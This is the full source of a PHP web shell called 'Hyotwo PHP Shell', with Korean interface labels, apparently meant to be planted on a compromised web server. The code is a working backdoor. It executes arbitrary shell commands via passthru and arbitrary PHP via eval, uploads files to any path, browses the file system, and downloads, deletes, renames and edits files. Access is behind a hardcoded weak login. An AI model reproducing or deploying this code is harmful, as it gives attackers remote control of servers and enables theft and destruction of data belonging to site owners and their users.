<!DOCTYPE html>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head>
<title>Hyotwo PHP Shell</title>
<style type="text/css"> </style>

<body>

<body bgcolor='#000000'>
<center><table width=90% cellpadding=0 cellspacing=0 style="border: 1px solid #666666">
<tr><td width=100% height=70 bgcolor='white' style="border-bottom: 2px solid #666666" valign=top>
<table valign=top>
<tr><td valign=top>
<table valign=center class='ram'>
<tr><td width=5% align=right>
<font size=2 color=#888888>System:</font>
</td>
<td width=100%>
<font size=2 color=red><b><?php echo getsystem();?></b></font>
</td></tr>
<tr><td width=5% align=right>
<font size=2 color=#888888>Server:</font>
</td>
<td width=100%>
<font size=2 color=black><b><?php echo getserver();?></b></font>

</table>
</td>
</body>


<?php
 header('Content-Type: text/html; charset=utf-8');
$self = $_SERVER['PHP_SELF'];
$docr = $_SERVER['DOCUMENT_ROOT'];
$sern = $_SERVER['SERVER_NAME'];
$tend = "</tr></form></table><br><br><br><br>";
$downFile = @$_GET["downFile"];
$delFile = @$_GET["delFile"];
$refileName = @$_GET["refileName"];
$editFile = @$_GET["editFile"];

// Configuration
session_start();
error_reporting(0);
set_time_limit(9999999);
$login='hyotwo';
$password='123';
$auth=1;


//파일 다운로드
if (isset($downFile)) 
        {
        #@set_time_limit(600);  #Limits the maximum execution time
        $fileName = basename($downFile); //basename,filesize.readfile funtions use to read file.
        header("Content-Type: application/force-download; name=".$fileName); //Set http header info
        header("Content-Transfer-Encoding: binary");
        header("Content-Disposition: attachment; fileName=".$fileName);
        header("Expires: 0");
        header("Cache-Control: no-cache, must-revalidate");
        header("Pragma: no-cache");
      }
//파일 삭제
if(isset($delFile)&& $delFile!=""){    
        if(is_file($delFile)){     //Check if it is file type.
            $message = (@unlink($delFile)) //unlink funtion : Delete file if success return true else false.
              ? "<br><font color=red>삭제 완료'$delFile' </font></br>"
              : "<br><font color=red>삭제 실패</font></br>" ;
        }else{
            $message = "<br><font color=red> '$delFile' 존재하지 않음</font></br>";
        }
        echo $message;
      }

//파일명 변경
if (isset($refileName)){
  echo '<table>';
  echo '<form action="" method="post">';
  echo '<br>';
  echo '<tr>';
  echo '<td align="left">';
  echo '<font size="2">';
  echo '새로운 이름:';
  echo '<input type="text" name="newname"/>';
  echo '<input type="submit" value="확인"/>';
  echo '</tr></td></table>';
  $oldname=basename($refileName); //Get old Name
  if (@rename($oldname,$_POST['newname'])){
       echo '<script>alert(\'설정 완료\')</script>';}
  else
    { if (!empty($_POST['newname']))
        echo '<script>alert(\'설정 실패\')</script>';}
}
//파일 수정

if (isset($editFile)) {
  $content=basename($editFile);
  if(empty($_POST['newcontent'])){ //No change or first time edit file.
    echo '<table><tr>';
    echo '<form action="" method="post">';
    echo '<br><input type="submit" value="수정하기"/></br>';
	echo '<br></br>';
    echo '</tr>';    
    $fp=@fopen("$content","r");#fopen,fread,filesize,fclos,fwrite functions used to operate file.
    $data=@fread($fp,filesize($content));
    echo '<tr>';
    echo '<textarea name="newcontent" cols="80" rows="20" >';
    echo $data;
    @fclose($fp);
    echo '</textarea></tr></form></table>';
  }
   if (!empty($_POST['newcontent'])) //If file is not empty
    {
       $fp=@fopen("$content","w+");
       echo ($result=@fwrite($fp,$_POST['newcontent']))?"<font color=red>수정 완료</font>":"<font color=blue>수정 실패</font>"; 
       @fclose($fp);
    }
} 



function edit()
{
if ($_SESSION['edit'] == 1){
$_SESSION['edit']=0;
return "<br><center><input type=submit style=\"border:1px solid #666666;background:#333333;font-weight:bold;\" value=\"Save\"></center>";};
}

function getsystem()
{
	return php_uname('s')." ".php_uname('r')." ".php_uname('v');
};	

function getserver()
{
	return getenv("SERVER_SOFTWARE");
};

function pwd()
{
if($_POST['type']==3)
	{
		$_SESSION['pwd'] = stripslashes($_POST['value']);
	}
chdir($_SESSION['pwd']);
$cwd = getcwd();
if($u=strrpos($cwd,'/'))
	{
		if($u!=strlen($cwd)-1){
		return $cwd.'/';}
		else{return $cwd;};
	}
elseif($u=strrpos($cwd,'\\'))
	{
		if($u!=strlen($cwd)-1){
		return $cwd.'\\';}
		else{return $cwd;};
	};
}


if(@$_POST['action']=="exit")unset($_SESSION['hyo']);
if($auth==1){if(@$_POST['login']==$login && @$_POST['password']==$password)$_SESSION['hyo']=1;}else $_SESSION['hyo']='1';
if(@$_SESSION['hyo']==0){
echo $header;
echo '<center><table><form method="POST"><tr><td>Login:</td><td><input type="text" name="login" value=""></td></tr><tr><td>Password:</td><td><input type="password" name="password" value=""></td></tr><tr><td></td><td><input type="submit" value="Enter"></td></tr></form></table></center>';
echo $footer;
exit;}


if (!empty($_GET['ac'])) {$ac = $_GET['ac'];}
elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}





// Menu
echo "
|<a href=$self?ac=explore>디렉터리 뷰</a>|
|<a href=$self?ac=shell>명령어</a>|
|<a href=$self?ac=upload>파일업로드</a>|
|<a href=$self?ac=tools>도구</a>|
|<a href=$self?ac=eval>PHP Eval Code</a>|
|<a href=$self?ac=info>PHP info</a>|
<br><br><br><pre>";



switch($ac) {

// PHP 인포
case "info":

if(@$_GET['ac']=="info"){
@phpinfo();
exit;}

break;

// 명령어
case "shell":


echo <<<HTML
<font size=3 color=black><b>Shell</b></font>
<table>
<form action="$self" method="POST">
<input type="hidden" name="ac" value="shell">
<tr><td>
$$sern <input size="50" type="text" name="a"><input align="right" type="submit" value="Enter">
</td></tr>
<tr><td>

<textarea cols="100" rows="25">
HTML;


if (!empty($_POST['a'])){
passthru($_POST['a']);
}
echo "</textarea></td>$tend";

break;







//PHP Eval Code 
case "eval":


echo <<<HTML
<font size=3 color=black><b>PHP Eval</b></font>
<table>
<form method="POST" action="$self">
<input type="hidden" name="ac" value="eval">
<tr>
<td><textarea name="ephp" rows="10" cols="60"></textarea></td>
</tr>
<tr>
<td><input type="submit" value="Enter"></td>
$tend
HTML;

if (isset($_POST['ephp'])){
eval($_POST['ephp']);
}
break;


//도구
case "tools":

echo <<<HTML
<font size=3 color=black><b>Tool</b></font>
<table>
<form method="POST" action="$self">
<input type="hidden" name="dir" value="tools">
<tr>
<td>
<input type="radio" name="tac" value="1">B64 Decode<br>
<input type="radio" name="tac" value="2">B64 Encode<br><hr>
<input type="radio" name="tac" value="3">md5 Hash
</td>
<td><textarea name="tot" rows="5" cols="42"></textarea></td>
</tr>
<tr>
<td> </td>
<td><input type="submit" value="Enter"></td>
$tend
HTML;

if (!empty($_POST['tot']) && !empty($_POST['tac'])) {

switch($_POST['tac']) {

case "1":
echo "디코딩 결과:<b>" .base64_decode($_POST['tot']). "</b>";
break;

case "2":
echo "인코딩 결과:<b>" .base64_encode($_POST['tot']). "</b>";
break;

case "3":
echo "md5 해쉬값:<b>" .md5($_POST['tot']). "</b>";
break;
}}
break;


// 파일 업로드
case "upload":

echo <<<HTML
<font size=3 color=black><b>File Upload</b></font>
<table>
<form enctype="multipart/form-data" action="$self" method="POST">
<input type="hidden" name="ac" value="upload">
<tr>
<td>업로드 파일:</td>
<td><input size="48" name="file" type="file"></td>
</tr>
<tr>
<td>업로드 경로:</td>
<td><input size="48" value="$docr/" name="path" type="text"><input type="submit" value="실행"></td>
$tend
HTML;

if (isset($_POST['path'])){

$uploadfile = $_POST['path'].$_FILES['file']['name'];
if ($_POST['path']==""){$uploadfile = $_FILES['file']['name'];}

if (copy($_FILES['file']['tmp_name'], $uploadfile)) {
    echo "업로드 경로: $uploadfile\n";
    echo "업로드 파일명:" .$_FILES['file']['name']. "\n";
    echo "업로드 파일 크기:" .$_FILES['file']['size']. "\n";

} else {
    print "오류발생\n";
    print_r($_FILES);
}
}
break;





//디렉터리 뷰
case "explore":
 ?>

<table>
			<tr>
				<td>홈 디렉터리:
					<a href="?ac=explore&dir=<?php echo $_SERVER['DOCUMENT_ROOT'];?>">
					<?php echo $_SERVER['DOCUMENT_ROOT'];?></a>
				</td>
			</tr>
			<tr>
				<td>현재 경로:<?php
					$dir=@$_GET['dir'];
					if (!isset($dir) or empty($dir)) {
					  $dir=str_replace('\\','/',dirname(__FILE__));
					  echo "<font color=\"#00688B\">".$dir."</font>";
					} else {
					  
					  echo "<font color=\"#00688B\">".$dir."</font>";
					}
					?>
				</td>
			</tr>
			

<table width="100%" border="0" cellpadding="3" cellspacing="1">
		<tr>
		<td><b>디렉터리 목록</b></td>
		</tr>
		<tr>
		<?php
		$dirs=@opendir($dir);
		while ($file=@readdir($dirs)) { //Print sub dir and file.
		  $b="$dir/$file";
		  $a=@is_dir($b);
		  if($a=="1"){
			if($file!=".."&&$file!=".")  {
				 
				 echo "<th style=word-break:break-all>";
				 echo "<a href=\"?ac=explore&dir=".urlencode($dir)."/".urlencode($file)."\">$file</a>";
				 echo "</th>";
				  
			} else {
				 if($file=="..")
				 echo "<a href=\"?ac=explore&dir=".urlencode($dir)."/".urlencode($file)."\">상위 디렉터리</a>";
				}
			}
		}
		@closedir($dirs);
		?>
		</tr>
		</table>
		<hr>
		<table width="100%" border="0" cellpadding="3" cellspacing="1">
			<tr>
				<td><b>FileName</b></td>
				<td><b>FileDate</b></td>
				<td><b>FileSize</b></td>
				<td><b>FileOperations</b></td>
			</tr>

			<?php
			//Print all file
			$dirs=@opendir($dir);
			while ($file=@readdir($dirs)){
				$b="$dir/$file";
				$a=@is_dir($b);
				if($a=="0"){
					$size=@filesize("$dir/$file")/1024; 
					$lastsave=@date("Y-n-d H:i:s",filectime("$dir/$file"));
					echo "<tr>\n";
					echo "<td>$file</td>\n";
					echo "<td>$lastsave</td>\n";
					echo "<td>$size KB</td>\n";
					echo "<td><a href=\"?downFile=".urlencode($dir)."/".urlencode($file)."\"> [Down] </a>
							  <a href=\"?delFile=".urlencode($dir)."/".urlencode ($file)."\"> [Delete]</a>
							  <a href=\"?refileName=".urlencode($dir)."/".urlencode($file)."\"> [Rename] </a>
							  <a href=\"?editFile=".urlencode($dir)."/".urlencode($file)."\"> [Edit] </a></td>\n";
							 
							  
					echo "</tr>\n";
				}
			}
			@closedir($dirs);
		}
	?> 
		</table>


		
</pre>
</body>
</html>
